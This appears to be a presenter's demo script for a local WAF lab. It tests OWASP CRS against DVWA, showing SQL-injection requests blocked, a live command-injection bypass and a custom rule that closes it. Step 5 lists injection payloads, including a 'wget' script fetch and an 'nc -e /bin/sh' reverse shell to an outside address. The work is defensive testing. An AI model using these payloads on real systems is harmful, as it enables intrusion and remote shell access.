# Demo script (6 minutes)

Run everything from `D:\CyberLab\waf-lab` unless stated.

## 0. State the claim first (20s)

> "I tested OWASP CRS 4.30.0 with 37 payloads. It blocked everything based on SQL
> grammar, and failed on command injection because it matches command names, not
> shell syntax. I wrote one rule that closes the whole class."

## 1. Show the stack is live (30s)

```powershell
docker compose ps
```

Expect three containers, `waf` and `dvwa-db` healthy.

## 2. Show the guard works (45s)

```powershell
curl.exe -s -o NUL -w "WAF  : %{http_code}`n" "http://localhost/?id=1%27%20OR%201=1--%20-"
curl.exe -s -o NUL -w "DIRECT: %{http_code}`n" "http://localhost:8081/?id=1%27%20OR%201=1--%20-"
```

Expect `WAF: 403` and `DIRECT: 200`. That contrast is the control path.

## 3. Show why SQLi cannot be bypassed (60s)

```powershell
curl.exe -s -o NUL -w "%{http_code}`n" -G --data-urlencode "id=1' AND 1 LIKE 1-- -" "http://localhost/vulnerabilities/sqli/"
curl.exe -s -o NUL -w "%{http_code}`n" -G --data-urlencode "id=1' AND CASE WHEN 1 THEN 1 ELSE 0 END=1-- -" "http://localhost/vulnerabilities/sqli/"
```

Expect `403`, `403`. Then say: *rule 942100 is a SQL parser, so both are the same thing
to it.*

## 4. Show the bypass, live (90s) — the key moment

Temporarily remove the custom rule so the audience sees the original failure:

```powershell
Move-Item rules\custom-cmdi.conf rules\custom-cmdi.conf.off
docker exec waf sh -c "rm -f /opt/owasp-crs/plugins/custom-after.conf"
docker restart waf
```

Wait ~5 seconds, then:

```powershell
$r = curl.exe -s --data "ip=127.0.0.1%3Bid" --data "Submit=Submit" "http://localhost/vulnerabilities/exec/"
if ($r -match 'uid=(\d+)') { "BYPASS - executed as uid=$($Matches[1])" } else { "blocked" }
```

Expect `BYPASS - executed as uid=33`.

## 5. Show the fix (90s)

Restore the rule:

```powershell
Move-Item rules\custom-cmdi.conf.off rules\custom-cmdi.conf
docker restart waf
```

Wait ~5 seconds, then run the same command plus three more:

```powershell
foreach ($p in '127.0.0.1;id','127.0.0.1|id','127.0.0.1&&id','127.0.0.1;wget http://x/s.sh','127.0.0.1;nc -e /bin/sh 10.0.0.5 4444') {
  $code = curl.exe -s -o NUL -w "%{http_code}" --data-urlencode "ip=$p" --data-urlencode "Submit=Submit" "http://localhost/vulnerabilities/exec/"
  "$code | $p"
}
```

Expect five `403` lines — including two payloads never used during testing.

Then the false-positive check:

```powershell
foreach ($p in '127.0.0.1','8.8.8.8','localhost') {
  $code = curl.exe -s -o NUL -w "%{http_code}" --data-urlencode "ip=$p" --data-urlencode "Submit=Submit" "http://localhost/vulnerabilities/exec/"
  "$code | $p"
}
```

Expect three `200` lines.

## 6. Close (30s)

> "CRS is strong where it parses and weak where it enumerates. I didn't add more
> commands to the list — I removed the need for a list. That's why the two payloads I
> never tested are also blocked."
